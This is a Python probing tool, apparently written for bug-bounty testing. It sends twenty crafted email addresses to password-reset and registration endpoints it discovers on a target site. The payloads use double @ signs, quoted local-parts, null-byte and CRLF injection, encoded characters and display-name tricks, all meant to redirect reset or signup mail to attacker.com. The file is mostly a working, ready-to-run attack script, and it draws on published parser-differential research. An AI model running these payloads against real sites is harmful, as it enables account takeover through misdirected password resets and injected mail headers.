#!/usr/bin/env python3
"""
Email Parser Bypass Probe — exploits email parser differentials between frontend web
application and backend SMTP delivery. Based on PortSwigger's "Splitting the email atom"
research. Tests encoded chars, quoted local-parts, comments, multiple @ signs,
backslash escapes, Unicode confusables, angle brackets, display name injection.
"""
import argparse
import json
import sys
import os
import re
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BYPASS_PAYLOADS = [
    {"crafted": "admin%40attacker.com", "target_domain": "attacker.com", "name": "encoded_at_single", "description": "URL-encoded @ sign may be decoded differently by frontend vs SMTP server"},
    {"crafted": "admin@target.com@attacker.com", "target_domain": "attacker.com", "name": "double_at_different_backend", "description": "Multiple @ — frontend sees target.com, backend attacker.com"},
    {"crafted": '"admin@target.com"@attacker.com', "target_domain": "attacker.com", "name": "quoted_localpart_double", "description": "Quoted local-part — frontend drops quotes, SMTP respects them"},
    {"crafted": "admin(comment)@target.com", "target_domain": "target.com", "name": "comment_in_localpart", "description": "Comments in local-part — some SMTP servers strip (comment)"},
    {"crafted": "admin\\@attacker.com@target.com", "target_domain": "attacker.com", "name": "backslash_escape_at", "description": "Backslash-escaped @ — some parsers treat as escaped char before real @"},
    {"crafted": "admin@target.com%00@attacker.com", "target_domain": "attacker.com", "name": "null_byte_truncation", "description": "Null byte truncation — frontend may truncate to target.com, SMTP to attacker.com"},
    {"crafted": "admin@target.com.", "target_domain": "target.com", "name": "trailing_dot", "description": "Trailing dot in domain — some mail servers strip, others error, RFC difference"},
    {"crafted": ' "admin@target.com" <admin@attacker.com>', "target_domain": "attacker.com", "name": "display_name_injection", "description": "Display name + angle brackets — frontend sees display name, backend angle brackets"},
    {"crafted": "admin@[127.0.0.1]", "target_domain": "127.0.0.1", "name": "ip_literal_domain", "description": "IP literal domain — may bypass domain-based ACL checks"},
    {"crafted": "admin@@target.com", "target_domain": "target.com", "name": "double_at_sign", "description": "Double @@ — parsed inconsistently between implementations"},
    {"crafted": "adm\x69n@target.com", "target_domain": "target.com", "name": "unicode_escape_confusable", "description": "Unicode escape sequences in local-part — confusable display name"},
    {"crafted": "%61dmin@target.com", "target_domain": "target.com", "name": "url_encoded_localpart", "description": "URL-encoded local-part — decoded before SMTP or not?"},
    {"crafted": "admin@target..com", "target_domain": "target..com", "name": "double_dot_domain", "description": "Double dot in domain — RFC ambiguity"},
    {"crafted": "admin@target.com%0d%0a@attacker.com", "target_domain": "attacker.com", "name": "crlf_injection", "description": "CRLF injection in email — header injection during SMTP delivery"},
    {"crafted": "admin@%74arget.com", "target_domain": "target.com", "name": "encoded_domain_chars", "description": "URL-encoded chars in domain — decoded before DNS lookup?"},
    {"crafted": "admin@target.com%09@attacker.com", "target_domain": "attacker.com", "name": "tab_separated_double", "description": "Tab character between email addresses"},
    {"crafted": "admin+extrabits@target.com", "target_domain": "target.com", "name": "plus_addressing", "description": "Plus addressing — SMTP aliases may circumvent account uniqueness checks"},
    {"crafted": ' "\\"admin@target.com\\" "@attacker.com', "target_domain": "attacker.com", "name": "escaped_quotes", "description": "Escaped quotes in quoted local-part — double parse required"},
    {"crafted": "admin\\.@target.com", "target_domain": "target.com", "name": "escaped_dot", "description": "Escaped dot in local-part — SMTP interprets as literal dot, UI ignores"},
    {"crafted": "@target.com@attacker.com", "target_domain": "attacker.com", "name": "leading_empty_localpart", "description": "Leading empty local-part before @ — second @ is the real separator?"},
]

PASSWORD_RESET_ENDPOINTS = [
    "/forgot-password",
    "/reset-password",
    "/forgot",
    "/auth/reset",
    "/recover",
    "/password-reset",
    "/account/recover",
    "/login/forgot",
    "/api/reset-password",
    "/auth/forgot",
]

REGISTRATION_ENDPOINTS = [
    "/register",
    "/signup",
    "/auth/register",
    "/create-account",
    "/join",
    "/auth/signup",
    "/user/register",
    "/api/register",
    "/sign-up",
    "/registration",
]


def load_context(context_path):
    if not context_path or not os.path.exists(context_path):
        return {}
    try:
        with open(context_path) as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[warn] Failed to load context: {e}", file=sys.stderr)
        return {}


def test_email_endpoint(target, endpoint, email, session, timeout):
    result = {
        "endpoint": endpoint,
        "crafted_email": email["crafted"],
        "test_name": email["name"],
        "status_code": 0,
        "response_length": 0,
        "accepted_by_server": False,
        "error_message": None,
        "success_reflection": None,
        "error": None,
    }

    try:
        full_url = f"{target.rstrip('/')}{endpoint}"
        data = {"email": email["crafted"]}
        resp = session.post(full_url, data=data, timeout=timeout, allow_redirects=False)
        result["status_code"] = resp.status_code
        result["response_length"] = len(resp.text or "")
        body_text = (resp.text or "").lower()

        if resp.status_code in (200, 201, 202, 302):
            result["accepted"] = True
            if "success" in body_text or "sent" in body_text or "check your" in body_text:
                result["accepted_by_server"] = True
                result["success_reflection"] = body_text[:200]

        error_keywords = [
            ("invalid email", "email_format_rejected"),
            ("not found", "email_not_found"),
            ("does not match", "email_mismatch"),
            ("format", "format_error"),
            ("must be", "validation_error"),
            ("required", "required_error"),
            ("valid", "validity_check"),
        ]
        for kw, label in error_keywords:
            if kw in body_text:
                result["error_message"] = label
                break

        if result["accepted_by_server"]:
            print(f"  [ACCEPTED] {email['name']}: {email['crafted'][:60]} at {endpoint} (status={resp.status_code})", file=sys.stderr)

    except requests.exceptions.Timeout:
        result["error"] = "timeout"
    except requests.exceptions.ConnectionError as e:
        result["error"] = f"connection: {e}"
    except Exception as e:
        result["error"] = str(e)

    return result


def discover_endpoints(target, session, timeout):
    discovered = {"password_reset": [], "registration": []}

    for ep in PASSWORD_RESET_ENDPOINTS:
        try:
            full = f"{target.rstrip('/')}{ep}"
            resp = session.head(full, timeout=timeout, allow_redirects=False)
            if resp.status_code < 500 and resp.status_code != 404:
                discovered["password_reset"].append(ep)
                print(f"  [discovered] Reset endpoint: {ep} (status={resp.status_code})", file=sys.stderr)
        except Exception:
            pass

    for ep in REGISTRATION_ENDPOINTS:
        try:
            full = f"{target.rstrip('/')}{ep}"
            resp = session.head(full, timeout=timeout, allow_redirects=False)
            if resp.status_code < 500 and resp.status_code != 404:
                discovered["registration"].append(ep)
                print(f"  [discovered] Registration endpoint: {ep} (status={resp.status_code})", file=sys.stderr)
        except Exception:
            pass

    if not discovered["password_reset"]:
        discovered["password_reset"] = ["/forgot-password"]
    if not discovered["registration"]:
        discovered["registration"] = ["/register"]

    return discovered


def main():
    parser = argparse.ArgumentParser(
        description="Email Parser Bypass Probe — exploits email parser differentials for registration/password-reset bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target https://target.com --context .bb/context.json
  %(prog)s --target https://target.com --registration-endpoint /register --dry-run
  %(prog)s --target https://target.com --output email_bypass_findings.jsonl
        """,
    )
    parser.add_argument("--context", default=None, help="Path to context.json")
    parser.add_argument("--target", required=True, help="Target URL (e.g. https://target.com)")
    parser.add_argument("--registration-endpoint", default=None, help="Override registration endpoint (auto-discover if not provided)")
    parser.add_argument("--password-reset-endpoint", default=None, help="Override password reset endpoint (auto-discover if not provided)")
    parser.add_argument("--output", default=None, help="Output findings.jsonl path")
    parser.add_argument("--timeout", type=int, default=12, help="Request timeout in seconds (default: 12)")
    parser.add_argument("--rate-limit", type=int, default=2, help="Max requests per second (default: 3)")
    parser.add_argument("--dry-run", action="store_true", help="Print planned tests without executing")
    parser.add_argument("--proxy", default=None, help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--user-agent", default="EmailParserBypass/1.0 (security research)", help="Custom User-Agent")
    parser.add_argument("--retries", type=int, default=2, help="Retries on failure (default: 2)")
    parser.add_argument("--email-list", default=None, help="Custom email bypass payload file (one per line)")
    args = parser.parse_args()

    ctx = load_context(args.context)
    outdir = ctx.get("outdir", os.getcwd())
    evidence_dir = ctx.get("evidence_dir", os.path.join(outdir, "evidence"))
    os.makedirs(outdir, exist_ok=True)
    os.makedirs(evidence_dir, exist_ok=True)

    output_path = args.output
    if not output_path:
        output_path = os.path.join(outdir, "email_parser_bypass_findings.jsonl")

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = f"https://{target}"

    session = requests.Session()
    session.headers.update({
        "User-Agent": args.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
    adapter = requests.adapters.HTTPAdapter(max_retries=args.retries)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    payloads = list(BYPASS_PAYLOADS)
    if args.email_list and os.path.exists(args.email_list):
        with open(args.email_list) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.append({
                        "crafted": line,
                        "target_domain": "unknown",
                        "name": f"custom_{line[:20]}",
                        "description": "Custom bypass payload from wordlist",
                    })

    print(f"[info] {len(payloads)} email bypass payloads ready", file=sys.stderr)

    if args.dry_run:
        for p in payloads[:10]:
            print(f"[dry-run] Test {p['name']}: {p['crafted']}", file=sys.stderr)
        print(f"[dry-run] {len(payloads)} total payloads — output would go to {output_path}", file=sys.stderr)
        return

    print("[*] Discovering email endpoints...", file=sys.stderr)
    endpoints = discover_endpoints(target, session, args.timeout)

    if args.password_reset_endpoint:
        endpoints["password_reset"] = [args.password_reset_endpoint]
    if args.registration_endpoint:
        endpoints["registration"] = [args.registration_endpoint]

    all_endpoints = []
    for ep in endpoints["password_reset"]:
        all_endpoints.append(("password_reset", ep))
    for ep in endpoints["registration"]:
        all_endpoints.append(("registration", ep))

    if not all_endpoints:
        all_endpoints = [("password_reset", "/forgot-password"), ("registration", "/register")]

    print(f"[*] Testing {len(all_endpoints)} endpoints x {len(payloads)} payloads", file=sys.stderr)

    all_findings = []
    with open(output_path, "w") as outfile:
        for ep_category, ep_path in all_endpoints:
            print(f"  [{ep_category}] {ep_path}", file=sys.stderr)
            for email_def in payloads:
                result = test_email_endpoint(target, ep_path, email_def, session, args.timeout)
                result["endpoint_category"] = ep_category
                outfile.write(json.dumps(result) + "\n")
                all_findings.append(result)
                if args.rate_limit > 0:
                    time.sleep(1.0 / max(1, args.rate_limit))

    accepted = [f for f in all_findings if f.get("accepted_by_server")]
    print(f"\n[done] {len(accepted)}/{len(all_findings)} payloads accepted by server", file=sys.stderr)
    if accepted:
        print("[!] Accepted emails — these may bypass frontend validation:", file=sys.stderr)
        for a in accepted:
            print(f"    [{a['endpoint_category']}] {a['crafted_email'][:80]}")

    print(f"[done] Findings written to {output_path}", file=sys.stderr)

    summary = {
        "total_tests": len(all_findings),
        "accepted_by_server": len(accepted),
        "endpoints": [ep for _, ep in all_endpoints],
        "target": target,
        "output_path": output_path,
    }
    print(json.dumps(summary, indent=2), file=sys.stderr)


if __name__ == "__main__":
    main()